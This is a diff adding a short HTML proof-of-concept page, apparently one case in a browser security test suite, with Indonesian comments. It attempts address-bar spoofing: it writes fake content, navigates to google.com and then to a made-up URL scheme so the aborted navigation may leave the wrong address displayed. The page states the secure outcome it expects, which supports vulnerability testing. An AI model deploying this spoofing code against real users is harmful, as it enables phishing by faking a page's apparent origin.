@@ -1,0 +1,20 @@
+<!-- 7 | address-bar spoof - HOLD pakai SKEMA TAK DIKENAL | [1-CLICK]
+     GENOME  A=unknown-scheme abort  B=location=  C=click  D=S1  F=document.write
+     KENAPA INI BEDA  browser mencoba menyerahkan skema asing ke OS, gagal, lalu MEMBATALKAN navigasi.
+     Pembatalan itu terjadi di jalur kode yang berbeda dari timeout jaringan - dan jalur itu
+     sering lupa mengembalikan omnibox. Skema sengaja dibuat tidak ada supaya NOL aplikasi terbuka.
+     EXPECTED-SECURE  omnibox tidak berubah sama sekali oleh navigasi yang dibatalkan. KONTROL  3.html -->
+<button onclick="go()">Run 7</button>
+<p id=r></p>
+<script>
+document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+function go() {
+  document.write('<h2>SPOOFED via skema asing &mdash; bukan google.com</h2>');
+  location = 'https://www.google.com/';
+  setTimeout(function () { location = 'xnurx-noop-scheme://hold'; }, 30);
+  setInterval(function () {
+    location = 'https://www.google.com/';
+    setTimeout(function () { location = 'xnurx-noop-scheme://hold'; }, 30);
+  }, 4000);
+}
+</script>
